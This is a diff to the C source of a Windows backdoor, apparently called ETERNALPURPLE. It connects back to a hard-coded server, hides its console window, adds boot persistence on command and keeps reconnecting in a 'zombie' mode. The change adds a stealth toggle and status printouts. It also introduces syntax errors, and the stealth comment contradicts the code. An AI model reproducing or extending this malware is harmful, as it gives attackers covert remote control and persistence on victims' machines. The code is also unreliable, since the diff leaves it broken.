@@ -14,14 +14,16 @@
 #define bzero(p, size) (void) memset ((p), 0, (size))
 
 
-int sock;
+
 unsigned short ServPort = 50005;//Server Port
 char *ServIP  = "192.168.174.129";//Server IP
-int zombie_bool = 0;//If shell mode is enabled
+int stealth_bool = 1//Change to 0 to hide window <-------Change stealth HERE
 
-void zombie(){
-	closesocket(sock);
-}
+
+
+//--Other Vars
+int zombie_bool = 0;//If shell mode is enabled
+int sock;
 
 //BOOTRUN used to enable persistance on victims machine(autorun on boot)
 int bootRun(){
@@ -105,7 +107,7 @@ void Shell(){ //Once connected execute custom commands or bash
 		 bzero(total_response, sizeof(total_response));
 		 recv(sock, buffer, 1024, 0);
 		//-----ETERNALPURPLE-COMMANDS------
-		if (strncmp("q", buffer, 1) == 0) {//Use "q" to quit
+		if (strncmp("q", buffer, 1) == 0) {//Use "q" to terminate process
 			 closesocket(sock);
 			 WSACleanup();
 			 exit(0);
@@ -116,7 +118,7 @@ void Shell(){ //Once connected execute custom commands or bash
 		else if(strncmp("persist", buffer, 7) == 0){//Use "persist" to try enable boot run
 			bootRun();
 		}
-		else if(strncmp("zombie", buffer, 6) == 0){//Use "zombie" to background current session
+		else if(strncmp("zombie", buffer, 6) == 0){//Use "zombie" to background current session( malware will keep trying to connect back to you)
 			char zomb[128] = "Zombie Mode Enabled \n";
 			send(sock, zomb, sizeof(zomb),0);
 			zombie_bool= 1;
@@ -164,13 +166,17 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	HWND stealth;
 	AllocConsole();
 	stealth = FindWindow("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, 0);
+	ShowWindow(stealth, stealth_bool);/
 	do{
-		//2) DEFINE NETWORKNG STUFF NEEDED (PORT & IP)
+		if(stealth_bool == 0) printf("Trying to connect to server\n");
+		//2) DEFINE NETWORKNG STUFF NEEDED 
 		connect_victim();
 		//4)If connection was succesful  EXECUTE SHELL funciont (main functionalities) 
+		if(stealth_bool == 0) printf("Connected entering Shell mode\n");
 		Shell();
+		if(stealth_bool == 0) printf("Exited Shell\n");
 	}while(zombie_bool==1);
 	//End of execution
+	if(stealth_bool == 0) printf("Exiting\n");
 	exit(0);
 }
